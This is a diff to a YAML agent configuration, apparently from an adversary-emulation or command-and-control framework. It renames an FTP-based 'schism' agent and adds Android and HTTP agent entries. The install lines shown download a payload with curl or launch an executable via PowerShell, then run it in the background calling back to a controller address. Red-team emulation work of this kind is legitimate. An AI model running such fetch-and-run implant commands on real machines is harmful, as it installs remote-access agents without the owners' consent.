@@ -52,13 +52,13 @@ pneuma:
         Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
     pneuma-darwin: {}
 
-schism:
+schism-ftp:
   metadata:
-    description: Simple FTP agent (requires a translator)
+    description: Simple Python FTP agent (requires a translator)
     purpose: agent
     zip: 1
     build: |
-      cp SRC.PATH/schism.py DST.PATH
+      cp SRC.PATH/schism-ftp.py DST.PATH
     platforms: 
       - windows
       - linux
@@ -66,9 +66,40 @@ schism:
     protocols:
       - ftp
   payloads:
-    schism.py:
+    schism-ftp.py:
       install: |
         curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
+
+schism-android:
+  metadata:
+    description: Simple Python agent for Android
+    purpose: agent
+    zip: 1
+    build: |
+      cp SRC.PATH/schism-android.py DST.PATH
+    platforms: 
+      - android
+      - linux
+    protocols:
+      - http
+  payloads:
+    schism-android.py: {}
+
+schism-http:
+  metadata:
+    description: Simple HTTP Python agent
+    purpose: agent
+    zip: 1
+    build: |
+      cp SRC.PATH/schism-http.py DST.PATH
+    platforms: 
+      - windows
+      - linux
+      - darwin
+    protocols:
+      - http
+  payloads:
+    schism-http.py: {}
 
 nicodemus:
   metadata:
